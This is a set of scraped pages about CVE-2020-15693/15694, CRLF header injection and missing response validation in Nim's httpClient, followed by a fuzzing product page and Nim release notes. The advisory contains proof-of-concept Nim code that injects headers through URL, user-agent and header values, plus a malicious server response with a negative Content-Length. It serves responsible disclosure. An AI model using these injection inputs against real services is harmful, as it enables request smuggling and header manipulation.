=== Content from www.openwall.com_077adb39_20250119_123118.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <E06593B2-81E5-4610-B127-D5D313036A1C@consensys.net>
Date: Thu, 4 Feb 2021 11:36:50 +0100
From: Martin Ortner <martin.ortner@...sensys.net>
To: oss-security@...ts.openwall.com
Subject: [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header
 Crlf Injection & Server Response Validation

title: "Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation"
date: 2020-07-30T18:41:52+01:00

cve: ["CVE-2020-15693", "CVE-2020-15694"]
vendor: nim-lang
vendorUrl: <https://nim-lang.org/>
authors: tintinweb
affectedVersions: [ "<= 1.2.6" ]
vulnClass: CWE-93

Vulnerability Note: <https://consensys.net/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/>
Vulnerability Note: <https://github.com/tintinweb/pub/blob/master/pocs/cve-2020-15694/>
Group: <https://consensys.net/diligence/research/>

## Summary

The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang `httpClient` standard library:

* a `CR-LF` injection in various arguments
* lack of response value validation when parsing server responses

## Details

### Description

The nim standard library `httpClient` is vulnerable to a `CR-LF` injection in the target url. This issue shares similarities with [CVE-2019-9740](<https://nvd.nist.gov/vuln/detail/CVE-2019-9740>) and [CVE-2019-9947](<https://nvd.nist.gov/vuln/detail/CVE-2019-9947>) reported for the Python language with the difference that more injection vectors exist. An injection is possible if the attacker controls any part of the url provided to `httpClient.[get|post|...]`, the user-agent, or custom http header names or values.

Additionally, the library fails to properly validate the server response. For example, `httpClient.get().contentLength()` does not raise any error if a malicious server provides a negative `Content-Length`.

It should be noted that there seems to be a general lack of input validation (requests and response) and we expect more vectors to exist (e.g. see `generateHeaders`).

### Proof of Concept

Note: `nim c -r -d:ssl client_inject.nim`

1) header injection in any url part

a) query

```nim
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

b) in the path

```nim
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433/a/1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /a/1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

2) header injection in user-agent, http headers

```nim
import httpClient
var client = newHttpClient("MyUserAgent\r\nX-Injected: myheader")
client.headers = newHttpHeaders({ "Content-Type": "applicat\r\nion/json" })
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`, `TEST: 123`

```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
content-type: applicat
ion/json
user-agent: MyUserAgent
X-Injected: myheader

```

3) Integers are parsed as signed ints instead of natural numbers

The `httpClient` silently accepts invalid return parameters. For example, the content-length header is initially stored as a string without being verified to be in a proper range. When accessing it, it is being parsed as a signed integer and therefore allows to return negative numbers.

```nim
proc contentLength*(response: Response | AsyncResponse): int =
## Retrieves the specified response's content length.
##
## This is effectively the value of the "Content-Length" header.
##
## A ``ValueError`` exception will be raised if the value is not an integer.
var contentLengthHeader = response.headers.getOrDefault("Content-Length")
return contentLengthHeader.parseInt()
```

Request:
```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

Malicious server response: `Content-Length: -23`
```http
HTTP/1.1 200 OK
Date: Sun, 10 Oct 2010 23:26:07 GMT
Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
Last-Modified: Sun, 26 Sep 2010 22:04:35 GMT
ETag: "45b6-834-49130cc1182c0"
Accept-Ranges: bytes
Content-Length: -23
Connection: close
Content-Type: text/html

Hello world!

```

Accessing the `Content-Length` yields the negative number -23.

```nim
import httpClient
var client = newHttpClient()
var response = client.get("http://localhost:4433/a/1 HTTP/1.1\r\nX-i\x00\x01YOnjected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

output:

```
⇒ nim c -r -d:ssl client_inject.nim
...
Hint: [Link]
Hint: 112071 LOC; 1.103 sec; 112.691MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject.nim; out: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [Exec]
-23
```

This might pose a risk to applications that are not checking whether response values are within sane bounds.

## Vendor Response

Vendor response: fixed in [v1.2.6](<https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html>)

### Timeline

```
JUL/09/2020 - contact nim developers @telegram; provided details, PoC
JUL/30/2020 - fixed in new release
```

## References

* [1] <https://nim-lang.org/>
* [2] <https://nim-lang.org/install.html>
* [3] [https://en.wikipedia.org/wiki/Nim_(programming_language](https://en.wikipedia.org/wiki/Nim_%28programming_language))
* [4] <https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from consensys.net_95d8d010_20250119_123118.html ===

[![Consensys Diligence](/images/logo/logo.svg)](/ "Home")

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")

# Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation

* [1 Summary](#summary)
* [2 Details](#details)
  + [2.1 Description](#description)
  + [2.2 Proof of Concept](#proof-of-concept)
  + [2.3 Proposed Fix](#proposed-fix)
* [3 Vendor Response](#vendor-response)
  + [3.1 Timeline](#timeline)
* [4 References](#references)

Request access to Fuzzing

[Book Now](https://consensys.io/diligence/fuzzing/)

| CVE | [CVE-2020-15693](https://nvd.nist.gov/vuln/detail/CVE-2020-15693)  [CVE-2020-15694](https://nvd.nist.gov/vuln/detail/CVE-2020-15694) |
| --- | --- |
| Vendor | [nim-lang](https://nim-lang.org/) |
| Affected Versions | <= 1.2.6 |
| Vulnerability Class | CWE-93 |
| Author(s) | tintinweb |
| Date | Jul 30, 2020 |

**Vulnerability Note**

## 1 Summary

The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang `httpClient` standard library:

* a `CR-LF` injection in various arguments
* lack of response value validation when parsing server responses

## 2 Details

### 2.1 Description

The nim standard library `httpClient` is vulnerable to a `CR-LF` injection in the target url. This issue shares similarities with [CVE-2019-9740](https://nvd.nist.gov/vuln/detail/CVE-2019-9740) and [CVE-2019-9947](https://nvd.nist.gov/vuln/detail/CVE-2019-9947) reported for the Python language with the difference that more injection vectors exist. An injection is possible if the attacker controls any part of the url provided to `httpClient.[get|post|...]`, the user-agent, or custom http header names or values.

Additionally, the library fails to properly validate the server response. For example, `httpClient.get().contentLength()` does not raise any error if a malicious server provides a negative `Content-Length`.

It should be noted that there seems to be a general lack of input validation (requests and response) and we expect more vectors to exist (e.g. see `generateHeaders`).

### 2.2 Proof of Concept

Note: `nim c -r -d:ssl client_inject.nim`

1. header injection in any url part

a) query

```
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()

```

Serialized request: see `X-injected`

```
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

b) in the path

```
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433/a/1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()

```

Serialized request: see `X-injected`

```
GET /a/1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

2. header injection in user-agent, http headers

```
import httpClient
var client = newHttpClient("MyUserAgent\r\nX-Injected: myheader")
client.headers = newHttpHeaders({ "Content-Type": "applicat\r\nion/json" })
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()

```

Serialized request: see `X-injected`, `TEST: 123`

```
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
content-type: applicat
ion/json
user-agent: MyUserAgent
X-Injected: myheader

```

3. Integers are parsed as signed ints instead of natural numbers

The `httpClient` silently accepts invalid return parameters. For example, the content-length header is initially stored as a string without being verified to be in a proper range. When accessing it, it is being parsed as a signed integer and therefore allows to return negative numbers.

```
proc contentLength*(response: Response | AsyncResponse): int =
  ## Retrieves the specified response's content length.
  ##
  ## This is effectively the value of the "Content-Length" header.
  ##
  ## A ``ValueError`` exception will be raised if the value is not an integer.
  var contentLengthHeader = response.headers.getOrDefault("Content-Length")
  return contentLengthHeader.parseInt()

```

Request:

```
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

Malicious server response: `Content-Length: -23`

```
HTTP/1.1 200 OK
Date: Sun, 10 Oct 2010 23:26:07 GMT
Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
Last-Modified: Sun, 26 Sep 2010 22:04:35 GMT
ETag: "45b6-834-49130cc1182c0"
Accept-Ranges: bytes
Content-Length: -23
Connection: close
Content-Type: text/html
Hello world!

```

Accessing the `Content-Length` yields the negative number -23.

```
import httpClient
var client = newHttpClient()
var response = client.get("http://localhost:4433/a/1 HTTP/1.1\r\nX-i\x00\x01YOnjected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()

```

output:

```
⇒  nim c -r -d:ssl  client_inject.nim
...
Hint:  [Link]
Hint: 112071 LOC; 1.103 sec; 112.691MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject.nim; out: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject  [Exec]
-23

```

This might pose a risk to applications that are not checking whether response values are within sane bounds.

### 2.3 Proposed Fix

* properly validate all parameters used in the module. Do not allow any context sensitive characters of the underlying protocol (e.g. `CR-LF`, `:` in header keys, …)
* validate the server response. Use `parseNatural` instead of `parseInt` to parse positive natural numbers.

## 3 Vendor Response

Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html) ([Official Security Advisory](https://github.com/nim-lang/security/security/advisories/GHSA-4xc7-fp2p-49j3))

### 3.1 Timeline

```
JUL/09/2020 - contact nim developers @telegram; provided details, PoC
JUL/30/2020 - fixed in new release
MAR/26/2021 - vendor advisory (https://github.com/nim-lang/security/security/advisories/GHSA-4xc7-fp2p-49j3), public disclosure

```
## 4 References

* [1] <https://nim-lang.org/>
* [2] <https://nim-lang.org/install.html>
* [3] [https://en.wikipedia.org/wiki/Nim\_(programming\_language)](https://en.wikipedia.org/wiki/Nim_%28programming_language%29)
* [4] <https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html>

![](/images/home/icon-ili-xs.png)

Request a Security Review Today

Get in touch with our team to request a quote for a smart contract audit.

[Contact Us](/contact/)

![](/images/home/icon-ili-outline-white.svg)

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")
[Careers](https://consensys.io/open-roles/?discipline=32525 "Careers")
[Privacy Policy](/privacy-policy/ "Privacy Policy")

Subscribe to Our Newsletter

Stay up-to-date on our latest offerings, tools, and the world of blockchain security.

[![](/images/home/powered-by.svg)](https://consensys.io)



=== Content from consensys.io_03fb8ddc_20250119_140857.html ===

[![Consensys Diligence](/images/logo/fuzzing-logo.svg)](/ "Home")

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")

# Fuzz it.

##### Let's go next level smart contract security with Diligence Fuzzing.

The most powerful fuzzer to find bugs and vulnerabilities before they are exploited by bad actors on mainnet. Combine with Scribble to set a target and unleash the fuzzer with millions of transactions to stress test your smart contract.

[Start Fuzzing](https://fuzzing.diligence.tools/login)
[Explore Scribble](https://consensys.io/diligence/scribble/)

![Fuzzing](https://diligence.consensys.io/fuzzing/fuzzing-hero-side-image.png)

## What the Fuzz?

#### Diligence Fuzzing gray-box property-based Fuzzing

Diligence Fuzzing is the smartest Fuzzer we know. Powered by cutting-edge research, this tool pioneered smart heuristics
to push the boundaries of gray-box fuzzing.
Save some time. We create unit tests AND system tests for you. All
you need to do is deploy your smart contract and unleash the fuzzer. It will
generate sequences of transactions (just like a user or an attacker
would) to cover your code.

[Read Docs](https://fuzzing-docs.diligence.tools/)

Coverage-guided

i.e., greybox fuzzing to build corpus of inputs that increases coverage.

Input Prediction

Our unique input prediction allows to systematically find inputs that will cover new code instead of random mutations.

[Learn more](https://consensys.io/diligence/blog/2018/12/fuzzing-smart-contracts-using-input-prediction/)

Transaction Sequence Simulation

We simulate multiple transaction sequences to test “deeper” interactions between functions.

Time Machine

Time machine to test functionality that may break in the future by simulating different time intervals between transactions

Incremental Fuzzing

Enables quick feedback when starting campaigns on code that was already fuzzed.

Fuzzing Lessons

Allows users to provide specific transaction sequences to increase coverage of critical parts of your code.

![](https://diligence.consensys.io/fuzzing/background-features.jpg)
#### Reporting Features

Comprehensive reporting about your fuzzing campaign.

Campaign Monitoring

Observe the Fuzzer covering more and more of your code while thousands of tests are executed per second. Indications like "Residual Risk" help to determine when to stop a campaign.

![](https://diligence.consensys.io/fuzzing/CoverageScreenshot.png)

Full Control

Whether a short test or extensive campaign, public or private report, single or multiple, parallel campaigns, you have full control over the platform.

![](https://diligence.consensys.io/fuzzing/PropertyViolationScreenshot.png)

Full Report

Find out immediately when a property has been violated. Details about the transaction that triggered a vulnerability help you to fix your code.

![](https://diligence.consensys.io/fuzzing/ReportControlScreenshot.png)

Observe the Fuzzer covering more and more of your code while thousands of tests are executed per second. Indications like "Residual Risk" help to determine when to stop a campaign.

![](https://diligence.consensys.io/fuzzing/CoverageScreenshot.png)

Whether a short test or extensive campaign, public or private report, single or multiple, parallel campaigns, you have full control over the platform.

![](https://diligence.consensys.io/fuzzing/PropertyViolationScreenshot.png)

Find out immediately when a property has been violated. Details about the transaction that triggered a vulnerability help you to fix your code.

![](https://diligence.consensys.io/fuzzing/ReportControlScreenshot.png)

Create a faster, more efficient and secure SDLC

With millions of transactions flowing daily, blockchain
companies need reliable tools to secure the growing internet
of value on the blockchain. Diligence Fuzzing provides:

Fuzzing at scale

Diligence Fuzzing is the only fuzzing solution to cover complex systems of one or more contracts to explore all possible user interactions and vulnerabilities, without the need for harnesses.

Comprehensive Security

Fuzzing minimizes risk and checks performance through the execution of millions of intelligently selected inputs, exploring all possible interactions with users and potential attackers.

Business Logic Integrity

Test business logic at the outset, check for correctness, and find security problems before they steer the ship astray.

Productivity

Code reviews and consecutive bug fixes are time-consuming, with long feedback loops. With Diligence Fuzzing, developers get swift, actionable feedback.

Readability

Scribble annotations of your specs improve an auditor’s ability to find flaws in your smart contracts.

## Start Diligence Fuzzing in 3 steps

Specify properties, submit code, inspect the report.

### Step 1

Define Scribble specifications

To use Diligence Fuzzing you first need to define specifications for your smart contract using Scribble, describing how your smart contracts should work. The fuzzer will use these Scribble properties to check for inconsistencies.

[Read Docs](https://docs.scribble.codes/)

![](https://diligence.consensys.io/fuzzing/Step1ScribbleScreenshot.png)

### Step 2

Submit code

Submit your code to the Diligence Platform to run fuzzing campaigns. We’ll analyze all complex systems of one or more contracts provided to detect violations of custom properties.

[Read Docs](https://fuzzing-docs.diligence.tools/)

![](https://diligence.consensys.io/fuzzing/Step2CliScreenshot.png)

### Step 3

Review the results

Receive campaign results and fix the violations in your code.

![](https://diligence.consensys.io/fuzzing/Step3ViewReportScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step1ScribbleScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step2CliScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step3ViewReportScreenshot.png)

#### Trusted by businesses worldwide.

Our early adopters use Diligence Fuzzing to help secure their projects.

* + > With Diligence Fuzzing, Consensys gave us an amazing framework and capability to seamlessly develop, test and launch our smart contracts that are serving as the foundation for the new space economy.

    Grant Blaisdell

    CEO & Co-Founder of Copernic Space

    ![](https://diligence.consensys.io/fuzzing/TestemonialAvatar1.png)
  + > We deal with multiple clients who often require a fast, trusted and easy to understand service to conduct security audits on their Smart Contracts before they go live. We offer a service that includes the use of Diligence Fuzz tool to facilitate this and it is perfect for the job. Not only is it simple and easy to use, but it provides clear results for action along with quantifiable security guarantees from the Fuzzing process. We really enjoy using Diligence fuzz tool to provide this robust security check as part of our service!

    Tak Fung

    CEO & Founder of Smart Contract Security Limited

    ![](https://diligence.consensys.io/fuzzing/TestemonialAvatar2.png)

#### Simple pricing, for every need.

Get started with a free explorer plan or opt for our professional plans for builders. All plans billed monthly.

### Explorer

For users who want to explore fuzzing as an additional security layer.

#### $0

* 1x Core Performance
* Up to 100 5 min campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Builder

For users who are ready to level up their security practices and stress test longer.

#### $250

* 1x Core Performance
* Unlimited 1 hour campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Pro Builder

For power users who require serious security, in-depth analysis and no time constraints.

#### $1,999

* 2x Core Performance
* Unlimited Hours and campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Enterprise

For larger teams needing multiple licenses, simultaneous campaigns and maximum performance.

#### Custom

* 4x Core Performance
* Unlimited Hours and campaigns
* Run 2 Campaigns at a time
* Supports Foundry projects

[Contact Us](https://share.hsforms.com/1TvCKjmAMTC2gCezqiexVTw2urwb)

![](/images/home/icon-ili-xs.png)

Request a Security Review Today

Get in touch with our team to request a quote for a smart contract audit.

[Contact Us](/contact/)

![](/images/home/icon-ili-outline-white.svg)

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")
[Careers](https://consensys.io/open-roles/?discipline=32525 "Careers")
[Privacy Policy](/privacy-policy/ "Privacy Policy")

Subscribe to Our Newsletter

Stay up-to-date on our latest offerings, tools, and the world of blockchain security.

[![](/images/home/powered-by.svg)](https://consensys.io)



=== Content from nim-lang.org_b502afb0_20250119_123120.html ===

[![Nim](/assets/img/logo.svg)](/)

* [Blog](/blog.html)
* [Features](/features.html)
* [Download](/install.html)
* [Documentation](/documentation.html)
* [Forum](https://forum.nim-lang.org)
* [Donate](/donate.html)
* [Source](https://github.com/nim-lang/Nim)

# Versions 1.2.6 and 1.0.8 released

### 30 July 2020 The Nim Team

The Nim team is happy to announce this double release of versions 1.2.6 and 1.0.8.

# Version 1.2.6

Version 1.2.6 is our third patch release for Nim 1.2 and it brings several new
fixes since versions 1.2.2 and 1.2.4 (the latter was just a hotfix release,
because 1.2.2 was mistakenly shipped without `nim-gdb`).

## Installing Nim 1.2.6

### New users

Check out if the package manager of your OS already ships version 1.2.6 or
install it as described [here](https://nim-lang.org/install.html).

### Existing users

If you have installed a previous version of Nim using `choosenim`,
getting Nim 1.2.6 is as easy as:

```
$ choosenim update stable

```

Alternatively, you can download Nim 1.0.8 from
[our nightlies builds](https://github.com/nim-lang/nightlies/releases/tag/2020-07-29-version-1-2-bf320ed).

## Bugfixes since 1.2.2

* Fixed âThe pegs module doesnât work with generics!â
  ([#14718](https://github.com/nim-lang/Nim/issues/14718))
* Fixed â[goto exceptions] {.noReturn.} pragma is not detected in a case expressionâ
  ([#14458](https://github.com/nim-lang/Nim/issues/14458))
* Fixed â[exceptions:goto] C compiler error with dynlib pragma calling a procâ
  ([#14240](https://github.com/nim-lang/Nim/issues/14240))
* Fixed âNim source archive install: âinstall.shâ fails with error: cp: cannot stat âbin/nim-gdbâ: No such file or directoryâ
  ([#14748](https://github.com/nim-lang/Nim/issues/14748))
* Fixed âStropped identifiers donât work as field names in tuple literalsâ
  ([#14911](https://github.com/nim-lang/Nim/issues/14911))
* Fixed âuri.decodeUrl crashes on incorrectly formatted inputâ
  ([#14082](https://github.com/nim-lang/Nim/issues/14082))
* Fixed âodbcsql module has some wrong integer typesâ
  ([#9771](https://github.com/nim-lang/Nim/issues/9771))
* Fixed â[ARC] Compiler crash declaring a finalizer proc directly in ânewââ
  ([#15044](https://github.com/nim-lang/Nim/issues/15044))
* Fixed âcode with named arguments in proc of winim/com can not been compiledâ
  ([#15056](https://github.com/nim-lang/Nim/issues/15056))
* Fixed âjavascript backend produces javascript code with syntax error in object syntaxâ
  ([#14534](https://github.com/nim-lang/Nim/issues/14534))
* Fixed â[ARC] SIGSEGV when calling a closure as a tuple field in a seqâ
  ([#15038](https://github.com/nim-lang/Nim/issues/15038))
* Fixed âCompiler crashes when using string as object variant selector with else branchâ
  ([#14189](https://github.com/nim-lang/Nim/issues/14189))
* Fixed âConstructing a uint64 range on a 32-bit machine leads to incorrect codegenâ
  ([#14616](https://github.com/nim-lang/Nim/issues/14616))

Full changelog since v1.2.2 contains [30 commits](https://github.com/nim-lang/Nim/compare/v1.2.2...v1.2.6).

# Verson 1.0.8

Version 1.0.8 is our fourth patch release for Nim 1.0 for those users who havenât
yet switched to Nim 1.2, coming 5 months after the release of Nim 1.0.6.

If you are still on Nim 1.0.x, and would like to know about new features
available in Nim 1.2.x, check out our
[version 1.2.0 release article](https://nim-lang.org/blog/2020/04/03/version-120-released.html).

## Installing Nim 1.0.8

### New users

We recommend you to install Nim 1.2, see the instructions above.

### Existing users

If you have installed a previous version of Nim using `choosenim`,
getting Nim 1.0.8 is as easy as:

```
$ choosenim 1.0.8

```

Alternatively, you can download Nim 1.0.8 from
[our nightlies builds](https://github.com/nim-lang/nightlies/releases/tag/2020-07-29-version-1-0-b5ec602).

## Bugfixes since 1.0.6

* Fixed âwrite requires conversion to stringâ
  ([#13182](https://github.com/nim-lang/Nim/issues/13182))
* Fixed âSome remarks to stdlib documentationâ
  ([#13352](https://github.com/nim-lang/Nim/issues/13352))
* Fixed â[Macro] Crash on malformed case statement with multiple elseâ
  ([#13255](https://github.com/nim-lang/Nim/issues/13255))
* Fixed âregression: `echo 'discard' | nim c -r -` generates a file â-â ; `-` should be treated speciallyâ
  ([#13374](https://github.com/nim-lang/Nim/issues/13374))
* Fixed âInternal error in getTypeDescAuxâ
  ([#13378](https://github.com/nim-lang/Nim/issues/13378))
* Fixed âInternal error in getTypeDescAuxâ
  ([#13378](https://github.com/nim-lang/Nim/issues/13378))
* Fixed âjoinPath(ââ, ââ) is â/â ; should be âââ
  ([#13455](https://github.com/nim-lang/Nim/issues/13455))
* Fixed âtables.values is brokenâ
  ([#13496](https://github.com/nim-lang/Nim/issues/13496))
* Fixed âArrays are passed by copy to iterators, causing crashes, unnecessary allocations and slowdownsâ
  ([#12747](https://github.com/nim-lang/Nim/issues/12747))
* Fixed â[regression] VM: Error: cannot convert -1 to uint64â
  ([#13661](https://github.com/nim-lang/Nim/issues/13661))
* Fixed âError: cannot convert -1 to uint (inside tuples)â
  ([#13671](https://github.com/nim-lang/Nim/issues/13671))
* Fixed âCritical: 1 completed Future, multiple await: Only 1 await will be awakened (the last one)â
  ([#13889](https://github.com/nim-lang/Nim/issues/13889))
* Fixed âopenssl wrapper corrupts stack on OpenSSL 1.1.1f + Androidâ
  ([#13903](https://github.com/nim-lang/Nim/issues/13903))
* Fixed âCant use expressions with `when` in `type` sections.â
  ([#14007](https://github.com/nim-lang/Nim/issues/14007))
* Fixed âIncorrect escape sequence for example in jsffi library documentationâ
  ([#14110](https://github.com/nim-lang/Nim/issues/14110))
* Fixed âcas is wrong for tccâ
  ([#14151](https://github.com/nim-lang/Nim/issues/14151))
* Fixed âInvalid return value of openProcess is NULL rather than `INVALID_HANDLE_VALUE(-1)` in windowsâ
  ([#14289](https://github.com/nim-lang/Nim/issues/14289))
* Fixed ânim-gdb is missing from all released packagesâ
  ([#13104](https://github.com/nim-lang/Nim/issues/13104))
* Fixed âThe pegs module doesnât work with generics!â
  ([#14718](https://github.com/nim-lang/Nim/issues/14718))
* Fixed âNim source archive install: âinstall.shâ fails with error: cp: cannot stat âbin/nim-gdbâ: No such file or directoryâ
  ([#14748](https://github.com/nim-lang/Nim/issues/14748))
* Fixed âStropped identifiers donât work as field names in tuple literalsâ
  ([#14911](https://github.com/nim-lang/Nim/issues/14911))
* Fixed âuri.decodeUrl crashes on incorrectly formatted inputâ
  ([#14082](https://github.com/nim-lang/Nim/issues/14082))
* Fixed âodbcsql module has some wrong integer typesâ
  ([#9771](https://github.com/nim-lang/Nim/issues/9771))
* Fixed âcode with named arguments in proc of winim/com can not been compiledâ
  ([#15056](https://github.com/nim-lang/Nim/issues/15056))
* Fixed âjavascript backend produces javascript code with syntax error in object syntaxâ
  ([#14534](https://github.com/nim-lang/Nim/issues/14534))
* Fixed âCompiler crashes when using string as object variant selector with else branchâ
  ([#14189](https://github.com/nim-lang/Nim/issues/14189))

Full changelog since v1.0.6 contains [82 commits](https://github.com/nim-lang/Nim/compare/v1.0.6...v1.0.8).

Unless otherwise stated, the content of this page is
licensed under the
[Creative Commons Attribution 3.0](https://creativecommons.org/licenses/by/3.0/)
license.
Code displayed on this website is MIT licensed.

This website is available on
[GitHub](https://github.com/nim-lang/website)
and contributions are welcome.
Original website design by
[Dominik Picheta](https://github.com/dom96) and
[Hugo Locurcio](https://github.com/Calinou).
Logo by [Joseph Wecker](https://github.com/josephwecker).

[![](/assets/img/do.png)](https://m.do.co/c/637ab907c7f4)



=== Content from nim-lang.org_88341cf2_20250119_140856.html ===

[![Nim](/assets/img/logo.svg)](/)

* [Blog](/blog.html)
* [Features](/features.html)
* [Download](/install.html)
* [Documentation](/documentation.html)
* [Forum](https://forum.nim-lang.org)
* [Donate](/donate.html)
* [Source](https://github.com/nim-lang/Nim)

# Efficient, expressive, elegant

## Nim is a statically typed compiled systems programming language. It combines successful concepts from mature languages like Python, Ada and Modula.

[Install Nim 2.2.0](/install.html)
[Try it online](https://play.nim-lang.org/#ix=2lK1)
### Efficient

* Nim generates native dependency-free executables, not dependent on a virtual machine,
  which are small and allow easy redistribution.
* The Nim compiler and the generated executables support all major platforms like
  Windows, Linux, BSD and macOS.
* Nim's memory management is deterministic and customizable with destructors and move
  semantics, inspired by C++ and Rust.
